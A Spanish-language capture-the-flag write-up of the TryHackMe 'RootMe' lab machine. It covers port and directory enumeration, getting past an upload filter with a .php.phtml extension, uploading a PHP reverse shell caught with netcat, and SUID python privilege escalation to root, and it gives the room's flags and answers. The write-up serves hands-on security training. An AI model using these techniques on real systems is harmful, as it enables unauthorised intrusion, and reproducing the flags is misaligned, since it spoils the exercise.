# RootMe - TryHackMe

- Objetivo: Obtener acceso al sistema y escalar privilegios hasta root.
- Fecha: 12/06/2025
- Autor del reto: Liiaam251
- Enlace a la máquina: [https://tryhackme.com/room/rrootme](https://tryhackme.com/room/rrootme)
- IP de la máquina: 10.10.135.37

## Enumeración de puertos con Nmap

### Comando utilizado

```bash
nmap -p- --open -sS -sV -sC -T4 -n -Pn 10.10.135.37
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-12 05:43 EDT
Nmap scan report for 10.10.135.37
Host is up (0.053s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: HackIT - Home
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.30 seconds
````
## Task 1 Deploy the machine
Deploy the machine
```bash
No answer needed
```
## Task 2 Reconnaissance

1: Scan the machine, how many ports are open?

```bash
2
```
2: What version of Apache is running?
```bash
2.4.29
```
3: What service is running on port 22?
```bash
ssh
````
## Enumeración subdominios gobuster

### Comando utilizado

```bash
$ gobuster dir -u http://10.10.135.37 -w /home/kali/Downloads/subdomains-top1mil-20000.txt -x html,php,txt -t 50

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.135.37
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /home/kali/Downloads/subdomains-top1mil-20000.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/panel                (Status: 301) [Size: 312] [--> http://10.10.135.37/panel/]
/css                  (Status: 301) [Size: 310] [--> http://10.10.135.37/css/]
/js                   (Status: 301) [Size: 309] [--> http://10.10.135.37/js/]
/uploads              (Status: 301) [Size: 314] [--> http://10.10.135.37/uploads/]
/index.php            (Status: 200) [Size: 616]
Progress: 80000 / 80004 (100.00%)
===============================================================
Finished
```
4: Find directories on the web server using the GoBuster tool.
```bash
No answer needed
```
5: What is the hidden directory?
```bash
/panel/
```

##Getting a shell

Nos redirigimos en nuestro navegador a http://<ip>/panel/ donde podemos ver que tenemos un panel con el que podemos subir un archivo, vamos a intentar subir una shell en php,
yo he utilizado esta DANDOLE PERMISOS DE EJECUCIÓN al instalarla: 

-  Enlace reverse shell: [https://github.com/pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell)
Recordar que hay que cambiar el puerto opcionalmente y la IP(tun0) obligatoriamentey despues ponernos en escucha con:

```bash
nc -lvnp <puerto_puesto>
```
Al intentar subir la reverse shell nos da error, php no admitido 

```bash
Select a file to upload:
PHP não é permitido!
````
Entonces le vamos a cambiar la extensión a .phtml
La extensión .phtml hace referencia a archivos que contienen código PHP embebido dentro de HTML. Es funcionalmente igual a .php, pero su uso puede tener ciertos contextos específicos.

Al cambiarle la extencion a .php.phtml
```bash
Select a file to upload:
O arquivo foi upado com sucesso!
```
Ahora solo tenemos que ejecutar la shell desde /uploads/ que lo hemos descubierto antes con gobuster y es donde se guardaban los archivos, al darle clic y estando por netcat en escucha estaríamos dentro

```bash
Index of /uploads
[ICO]	Name	Last modified	Size	Description
[PARENTDIR]	Parent Directory	 	- 	 
[ ]	php-reverse-shell.php.phtml	2025-06-12 10:21 	5.4K	 
Apache/2.4.29 (Ubuntu) Server at 10.10.68.176 Port 80
```
Nos vamos al netcat y vemos que ya tenemos acceso
```bash
nc -lvnp 4444                   
listening on [any] 4444 ...
connect to [10.9.3.53] from (UNKNOWN) [10.10.68.176] 36442
Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 10:25:14 up 4 min,  0 users,  load average: 0.03, 0.11, 0.06
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
````
Para que la consola se vea mejor he usado este comando:
````bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
````
## Task 3 - Getting a shell
1 user.txt
buscamos la flag con el comando 
````bash
find / -type f -name "user.txt" 2>/dev/null
````
nos movemos dentro y nos da la primera flag:

````bash
THM{y0u_g0t_a_sh3ll}
````
## Escalado de Privilgios - SUID

Buscamos posibles SUID con

````bash
www-data@rootme:/home$ find / -perm -4000 2>/dev/null
find / -perm -4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/traceroute6.iputils
/usr/bin/newuidmap
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/python
/usr/bin/at
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
...
````
Vemos que está python, vamos a buscar en GTFObins python a ver que sale en apartado de SUID:

recordar poner ruta del suid en vez de ./python o moverse a dicho directorio sino no irá

```bin
www-data@rootme:/home$ /usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
<hon -c 'import os; os.execl("/bin/sh", "sh", "-p")'
# whoami
whoami
root
````
## Task 3 - Privilege escalation

1. Search for files with SUID permission, which file is weird?
````bin
/usr/bin/python
````
2. Find a form to escalate your privileges.
````bin
No answer needed
````
2. root.txt
   
Nos movemos a al carpeta de root y hacemos ls para ver archivos y ahí está la flag
````bin
THM{pr1v1l3g3_3sc4l4t10n}
````





















